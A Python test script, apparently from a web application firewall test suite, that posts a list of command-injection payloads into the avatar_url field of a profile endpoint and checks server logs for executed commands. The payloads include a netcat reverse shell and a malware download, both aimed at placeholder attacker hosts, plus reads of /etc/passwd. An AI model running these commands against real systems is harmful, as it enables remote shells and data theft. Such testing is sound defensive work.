"""04_command_injection — 命令注入测试（avatar_url 字段）"""

import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from lib.test_utils import *


CMD_PAYLOADS = [
    ("分号注入", "http://x.com; id"),
    ("管道注入", "http://x.com | ls"),
    ("与注入", "http://x.com && whoami"),
    ("或注入", "http://x.com || whoami"),
    ("子命令 $()", "http://x.com $(id)"),
    ("反引号", "`id`"),
    ("文件读取", "http://x.com; cat /etc/passwd"),
    ("反弹shell", "http://x.com; nc -e /bin/sh attacker.com 4444"),
    ("文件下载", "http://x.com; wget http://evil.com/malware.sh"),
    ("换行绕过", "http://x.com%0aid"),
]


def run():
    print_banner("04: 命令注入 (avatar_url)")
    reset_counters()
    s = requests.Session()

    info("登录获取会话")
    r = s.post(urljoin(BASE_URL, "/login"), data={"username": "test", "password": "test123"},
               timeout=TIMEOUT, allow_redirects=True)
    assert_status(r, 200, "登录成功")

    info("命令注入攻击 (POST /profile avatar_url)")
    for desc, payload in CMD_PAYLOADS:
        try:
            r = s.post(urljoin(BASE_URL, "/profile"),
                       data={"email": "test@test.com", "bio": "cmd_inject_test", "avatar_url": payload},
                       timeout=TIMEOUT, allow_redirects=False)
            # 攻击成功与否都返回 200（正常渲染），关键看服务端是否执行了命令
            if r.status_code == 200:
                ok(f"{desc} → HTTP 200 (提交成功)")
            else:
                err(f"{desc} → HTTP {r.status_code} (期望: 200)")
        except requests.exceptions.Timeout:
            err(f"{desc} → 请求超时")
        except Exception as e:
            err(f"{desc} → 异常: {e}")

    info("检查服务端日志（命令执行痕迹）")
    # 检查服务端是否有命令执行相关日志
    try:
        logfile = "/tmp/waf-server.log"
        if os.path.exists(logfile):
            with open(logfile, "r") as f:
                log_content = f.read()
            if "[CMD]" in log_content:
                ok("服务端日志含 [CMD] 命令执行记录")
            else:
                warn("服务端日志未发现 [CMD] 记录")
        else:
            warn(f"日志文件不存在: {logfile}")
    except Exception as e:
        warn(f"无法读取日志: {e}")

    print_summary()
    save_results("04_command_injection")
    return STATE["fail"]


if __name__ == "__main__":
    sys.exit(run())
